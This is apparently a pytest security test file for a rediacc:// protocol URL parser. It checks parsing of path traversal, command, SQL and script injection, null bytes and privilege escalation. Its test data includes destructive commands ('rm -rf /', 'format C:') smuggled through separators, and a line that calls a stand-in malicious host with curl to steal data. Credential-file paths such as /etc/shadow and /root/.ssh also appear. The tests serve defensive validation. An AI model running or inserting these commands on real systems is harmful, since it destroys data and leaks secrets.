#!/usr/bin/env python3
"""
Security and safety tests for rediacc:// protocol handling
Tests for injection attacks, path traversal, and other security vulnerabilities
"""

import sys
import os
import tempfile
import subprocess
import shlex
from pathlib import Path
from unittest.mock import patch, Mock, MagicMock
import pytest

# Add src directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'src'))

from cli.core.protocol_handler import ProtocolUrlParser, ProtocolHandlerError


class TestProtocolSecurityValidation:
    """Test security validation and input sanitization"""

    def setup_method(self):
        """Set up test fixtures"""
        self.parser = ProtocolUrlParser()

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        malicious_urls = [
            "rediacc://token/../../etc/passwd/machine/repo",
            "rediacc://token/team/../../../root/machine/repo",
            "rediacc://token/team/machine/../../../../usr/bin/repo",
            "rediacc://token/team/machine/repo/../../../sensitive/path"
        ]

        for url in malicious_urls:
            result = self.parser.parse_url(url)

            # Path traversal should be treated as literal text, not interpreted
            assert '../' in result['team'] or '../' in result['machine'] or '../' in result['repository']

            # Components should not resolve to actual system paths
            for component in [result['team'], result['machine'], result['repository']]:
                # Should not resolve to root or sensitive directories
                assert not component.startswith('/')
                assert 'etc' not in component or '../' in component
                assert 'root' not in component or '../' in component

    def test_command_injection_prevention(self):
        """Test prevention of command injection in parameters"""
        injection_urls = [
            "rediacc://token/team/machine/repo/terminal?command=ls;rm -rf /",
            "rediacc://token/team/machine/repo/terminal?command=ls|rm -rf /",
            "rediacc://token/team/machine/repo/terminal?command=ls%26%26rm -rf /",  # URL-encoded &&
            "rediacc://token/team/machine/repo/terminal?command=ls`rm -rf /`",
            "rediacc://token/team/machine/repo/terminal?command=ls$(rm -rf /)",
            "rediacc://token/team/machine/repo/sync?localPath=;rm -rf /"
        ]

        for url in injection_urls:
            result = self.parser.parse_url(url)

            # Commands should be parsed literally without execution
            injection_found = False
            if 'command' in result['params']:
                command = result['params']['command']
                # Should contain the literal injection attempt
                if any(char in command for char in [';', '|', '&', '`', '$']):
                    injection_found = True

            if 'localPath' in result['params']:
                path = result['params']['localPath']
                # Should contain the literal injection attempt
                if ';' in path or '|' in path:
                    injection_found = True

            # At least one injection attempt should be found in each URL
            assert injection_found, f"No injection characters found in {url}"

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attempts"""
        sql_injection_urls = [
            "rediacc://token'; DROP TABLE users; --/team/machine/repo",
            "rediacc://token/team'; DELETE FROM data; --/machine/repo",
            "rediacc://token/team/machine'; INSERT INTO logs VALUES ('hack'); --/repo",
            "rediacc://token/team/machine/repo?param='; DROP TABLE users; --"
        ]

        for url in sql_injection_urls:
            result = self.parser.parse_url(url)

            # SQL injection should be treated as literal text
            found_sql_keywords = False
            for component in [result['token'], result['team'], result['machine'], result['repository']]:
                if any(keyword in component.upper() for keyword in ['DROP', 'DELETE', 'INSERT', 'SELECT']):
                    found_sql_keywords = True
                    # Should contain SQL but with quotes/comments intact
                    assert any(char in component for char in ["'", ";", "--"])

            # Check parameters for SQL injection attempts
            for param_value in result['params'].values():
                if any(keyword in param_value.upper() for keyword in ['DROP', 'DELETE', 'INSERT', 'SELECT']):
                    found_sql_keywords = True
                    assert any(char in param_value for char in ["'", ";", "--"])

    def test_script_injection_prevention(self):
        """Test prevention of script injection (XSS-style attacks)"""
        script_injection_urls = [
            "rediacc://token/team/machine/repo?param=<script>alert('xss')</script>",
            "rediacc://token/team/machine/repo?param=javascript:alert('xss')",
            "rediacc://token/team/machine/repo?param=<img src=x onerror=alert('xss')>",
            "rediacc://token/team/machine/repo/browser?path=<script>alert('xss')</script>"
        ]

        for url in script_injection_urls:
            result = self.parser.parse_url(url)

            # Script content should be preserved literally
            for param_value in result['params'].values():
                if '<script>' in param_value:
                    # Should contain the literal script tags
                    assert '<script>' in param_value and '</script>' in param_value
                elif 'javascript:' in param_value:
                    assert 'javascript:' in param_value
                elif 'onerror=' in param_value:
                    assert 'onerror=' in param_value

    def test_buffer_overflow_prevention(self):
        """Test handling of extremely long inputs"""
        # Create very long strings
        long_token = "a" * 10000
        long_team = "b" * 5000
        long_param_value = "c" * 20000

        overflow_url = f"rediacc://{long_token}/{long_team}/machine/repo?data={long_param_value}"

        # Should handle long inputs without crashing
        result = self.parser.parse_url(overflow_url)

        assert result['token'] == long_token
        assert result['team'] == long_team
        assert result['params']['data'] == long_param_value

    def test_null_byte_injection_prevention(self):
        """Test handling of null byte injection attempts"""
        null_byte_urls = [
            "rediacc://token/team\x00/machine/repo",
            "rediacc://token/team/machine/repo?param=value\x00malicious",
            "rediacc://token/team/machine/repo/terminal?command=ls\x00rm -rf /"
        ]

        for url in null_byte_urls:
            # Should handle null bytes safely
            result = self.parser.parse_url(url)

            # Null bytes should be preserved or safely handled
            assert result is not None

    def test_unicode_exploitation_prevention(self):
        """Test prevention of Unicode-based attacks"""
        unicode_urls = [
            "rediacc://token/team/machine/repo?param=\u202e/secret/path",  # Right-to-left override
            "rediacc://token/team/machine/repo?param=\ufeff/etc/passwd",   # BOM character
            "rediacc://token/team/machine/repo?param=\u2028\u2029script",  # Line separators
        ]

        for url in unicode_urls:
            result = self.parser.parse_url(url)

            # Unicode should be handled safely
            assert result is not None
            # Should preserve or safely handle Unicode characters
            for param_value in result['params'].values():
                assert param_value is not None

    def test_environment_variable_injection(self):
        """Test prevention of environment variable injection"""
        env_injection_urls = [
            "rediacc://token/team/machine/repo?localPath=$HOME/../../etc/passwd",
            "rediacc://token/team/machine/repo?localPath=${PATH}/../sensitive",
            "rediacc://token/team/machine/repo?command=echo $SECRET_KEY",
        ]

        for url in env_injection_urls:
            result = self.parser.parse_url(url)

            # Environment variables should be treated as literal text
            for param_value in result['params'].values():
                if '$' in param_value:
                    # Should contain literal $ character, not resolve variables
                    assert '$' in param_value


class TestProtocolExecutionSafety:
    """Test safety of protocol execution and command handling"""

    def setup_method(self):
        """Set up test fixtures"""
        self.temp_dir = Path(tempfile.mkdtemp())

    def teardown_method(self):
        """Clean up test fixtures"""
        if self.temp_dir.exists():
            import shutil
            shutil.rmtree(self.temp_dir)

    def test_safe_command_construction(self):
        """Test that commands are constructed safely"""
        # This tests the theoretical command construction from protocol URLs
        # In practice, this would test the actual CLI command execution path

        from cli.core.protocol_handler import ProtocolUrlParser
        parser = ProtocolUrlParser()

        dangerous_url = "rediacc://token/team/machine/repo/terminal?command=ls; rm -rf /"
        result = parser.parse_url(dangerous_url)

        command = result['params']['command']

        # Test that command would be safely escaped if passed to shell
        escaped_command = shlex.quote(command)
        assert escaped_command != command  # Should be escaped
        assert ';' not in escaped_command or escaped_command.startswith("'")

    def test_path_validation(self):
        """Test validation of file paths from protocol URLs"""
        path_urls = [
            "rediacc://token/team/machine/repo/sync?localPath=/etc/passwd",
            "rediacc://token/team/machine/repo/sync?localPath=C:\\Windows\\System32",
            "rediacc://token/team/machine/repo/browser?path=/root/.ssh",
            "rediacc://token/team/machine/repo/sync?localPath=../../../sensitive"
        ]

        for url in path_urls:
            parser = ProtocolUrlParser()
            result = parser.parse_url(url)

            # Paths should be preserved for validation by the actual handler
            if 'localPath' in result['params']:
                path = result['params']['localPath']
                # Should contain the original path for proper validation
                assert path is not None

            if 'path' in result['params']:
                path = result['params']['path']
                assert path is not None

    def test_parameter_type_safety(self):
        """Test type safety of parameters"""
        type_test_urls = [
            "rediacc://token/team/machine/repo/plugin?port=8888abc",  # Invalid port
            "rediacc://token/team/machine/repo/sync?mirror=notabool",  # Invalid boolean
            "rediacc://token/team/machine/repo/plugin?timeout=-1",     # Invalid timeout
        ]

        for url in type_test_urls:
            parser = ProtocolUrlParser()
            result = parser.parse_url(url)

            # Parameters should be strings that can be validated later
            for param_value in result['params'].values():
                assert isinstance(param_value, str)

    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks"""
        # Test with many parameters
        params = []
        for i in range(1000):
            params.append(f"param{i}=value{i}")

        large_url = f"rediacc://token/team/machine/repo/test?{'&'.join(params)}"

        parser = ProtocolUrlParser()
        result = parser.parse_url(large_url)

        # Should handle large number of parameters
        assert len(result['params']) <= 1000
        assert result['token'] == 'token'

    @patch('subprocess.run')
    def test_subprocess_safety(self, mock_subprocess):
        """Test safety of subprocess execution from protocol"""
        # This would test the actual CLI execution path
        mock_subprocess.return_value = Mock(returncode=0, stdout="", stderr="")

        # Simulate protocol handler execution
        dangerous_commands = [
            "rm -rf /",
            "format C:",
            "; curl http://malicious.com/steal_data",
            "$(rm -rf /)",
            "`rm -rf /`"
        ]

        for cmd in dangerous_commands:
            # Test that dangerous commands would be safely handled
            # In practice, this would test the actual CLI command execution
            escaped_cmd = shlex.quote(cmd)
            assert escaped_cmd.startswith("'") and escaped_cmd.endswith("'")


class TestProtocolAuthenticationSafety:
    """Test authentication and authorization aspects"""

    def test_token_validation(self):
        """Test token format validation"""
        token_test_cases = [
            ("valid-token-123", True),
            ("", False),  # Empty token
            ("a" * 1000, True),  # Very long token
            ("token with spaces", True),  # Token with spaces
            ("token\nwith\nnewlines", True),  # Token with newlines
            ("token\x00with\x00nulls", True),  # Token with null bytes
        ]

        parser = ProtocolUrlParser()

        for token, should_parse in token_test_cases:
            url = f"rediacc://{token}/team/machine/repo"

            if should_parse:
                result = parser.parse_url(url)
                assert result['token'] == token
            else:
                # Empty components should cause parsing to fail
                with pytest.raises(ProtocolHandlerError):
                    parser.parse_url(url)

    def test_component_boundary_validation(self):
        """Test validation of component boundaries"""
        boundary_test_urls = [
            "rediacc://token/team/machine/repo/action/extra/components",  # Too many components
            "rediacc://token/team/machine",  # Too few components
            "rediacc://token//machine/repo",  # Empty team
            "rediacc://token/team//repo",  # Empty machine
            "rediacc://token/team/machine/",  # Empty repository
        ]

        parser = ProtocolUrlParser()

        for url in boundary_test_urls:
            # Should handle gracefully or raise appropriate errors
            try:
                result = parser.parse_url(url)
                # If parsing succeeds, should have valid components
                assert result['token'] is not None
            except ProtocolHandlerError:
                # Expected for malformed URLs
                pass

    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attempts"""
        escalation_urls = [
            "rediacc://token/team/machine/repo/terminal?command=sudo rm -rf /",
            "rediacc://token/team/machine/repo/terminal?command=su - root",
            "rediacc://token/team/machine/repo/sync?localPath=/etc/shadow",
            "rediacc://token/team/machine/repo/browser?path=/root"
        ]

        parser = ProtocolUrlParser()

        for url in escalation_urls:
            result = parser.parse_url(url)

            # Commands should be preserved for proper authorization checking
            if 'command' in result['params']:
                command = result['params']['command']
                # Should contain privilege escalation attempts for proper filtering
                assert any(keyword in command for keyword in ['sudo', 'su -', 'rm -rf'])

    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        sensitive_urls = [
            "rediacc://password123/team/machine/repo",  # Sensitive token
            "rediacc://token/team/machine/repo?password=secret123",  # Password in params
            "rediacc://token/team/machine/repo?api_key=sk_live_123",  # API key in params
            "rediacc://token/team/machine/repo?token=Bearer xyz",  # Token in params
        ]

        parser = ProtocolUrlParser()

        for url in sensitive_urls:
            result = parser.parse_url(url)

            # Should parse but preserve data for proper handling
            assert result is not None

            # In practice, sensitive data should be flagged for secure handling
            if any(param in result['params'] for param in ['password', 'api_key', 'token']):
                # Should be marked for secure handling
                pass


class TestProtocolNetworkSafety:
    """Test network-related security aspects"""

    def test_url_redirection_prevention(self):
        """Test prevention of URL redirection attacks"""
        redirect_urls = [
            "rediacc://evil.com/team/machine/repo",
            "rediacc://localhost:8080/../../evil.com/machine/repo",
            "rediacc://token/team/machine/repo?redirect=http://evil.com"
        ]

        parser = ProtocolUrlParser()

        for url in redirect_urls:
            result = parser.parse_url(url)

            # Should parse domains as literal tokens
            if '.' in result['token']:
                # Domain-like tokens should be handled carefully
                assert result['token'] is not None

    def test_protocol_confusion_prevention(self):
        """Test prevention of protocol confusion attacks"""
        confusing_urls = [
            "rediacc://http://evil.com/team/machine/repo",
            "rediacc://ftp://evil.com/team/machine/repo",
            "rediacc://javascript:alert('xss')/team/machine/repo"
        ]

        parser = ProtocolUrlParser()

        for url in confusing_urls:
            result = parser.parse_url(url)

            # Should treat protocol-like strings as literal tokens
            assert result['token'].startswith(('http://', 'ftp://', 'javascript:'))


class TestProtocolErrorHandling:
    """Test error handling and failure scenarios"""

    def test_malformed_url_handling(self):
        """Test handling of malformed URLs"""
        malformed_urls = [
            "not a url at all",
            "rediacc:/malformed",
            "rediacc:///empty/components",
            "rediacc://token with spaces that breaks parsing/team/machine/repo"
        ]

        parser = ProtocolUrlParser()

        for url in malformed_urls:
            # Should either parse safely or raise appropriate errors
            try:
                result = parser.parse_url(url)
                # If it parses, should have basic structure
                assert 'token' in result
            except (ProtocolHandlerError, ValueError, TypeError):
                # Expected for malformed URLs
                pass

    def test_exception_safety(self):
        """Test that exceptions don't leak sensitive information"""
        parser = ProtocolUrlParser()

        try:
            # Intentionally cause an error
            parser.parse_url("rediacc://")
        except Exception as e:
            # Error messages should not contain sensitive information
            error_message = str(e).lower()
            assert 'password' not in error_message
            assert 'secret' not in error_message
            assert 'key' not in error_message

    def test_memory_safety(self):
        """Test memory safety with large inputs"""
        # Test with extremely large URL
        huge_token = "a" * 100000
        huge_url = f"rediacc://{huge_token}/team/machine/repo"

        parser = ProtocolUrlParser()

        # Should handle large inputs without memory issues
        result = parser.parse_url(huge_url)
        assert result['token'] == huge_token


if __name__ == '__main__':
    pytest.main([__file__, '-v'])